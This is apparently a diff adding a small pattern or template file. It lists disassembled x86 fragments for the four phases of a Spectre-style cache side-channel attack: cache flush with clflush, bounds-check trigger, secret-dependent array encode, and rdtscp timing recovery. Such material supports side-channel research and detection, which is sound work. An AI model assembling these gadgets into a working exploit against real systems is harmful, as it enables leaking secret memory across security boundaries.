@@ -1,0 +1,4 @@
+prepare|clflush	DS:[rax]
+trigger|mov	DS:[rbp + 0xfffffffffffffff8], rdi#mov	eax, DS:[rip + 0x201a6c]#mov	eax, eax#cmp	DS:[rbp + 0xfffffffffffffff8], rax#jnb	0x17
+encode|mov rax, DS:[rbp + 0xfffffffffffffff8]#add rax, 0x602080#movzx eax, DS:[rax]#movzx eax, eax#mov edi, eax#call 0xffffffffffffffa4#push rbp#mov rbp, rsp#mov eax, edi#mov DS:[rbp + 0xfffffffffffffffc], al#movzx eax, DS:[rbp + 0xfffffffffffffffc]#sal eax, 0x9#cdqe rax#movzx edx, DS:[rax + 0x6025c0]#movzx eax, DS:[t7 + 0x201b89]#and eax, edx#mov DS:[t7 + 0x201b81], al#nop#pop rbp#ret
+recover|rdtscp#mov	esi, ecx#mov	rcx, DS:[rbp + 0xffffffffffffffa8]#mov	DS:[rcx], esi#sal	rdx, 0x20#or	rax, rdx#mov	rbx, rax#mov	rax, DS:[rbp + 0xffffffffffffffd0]#movzx	eax, DS:[rax]#movzx	eax, eax#mov	DS:[rbp + 0xffffffffffffffa4], eax#lea	rax, DS:[rbp + 0xffffffffffffffa4]#mov	DS:[rbp + 0xffffffffffffffb0], rax#rdtscp
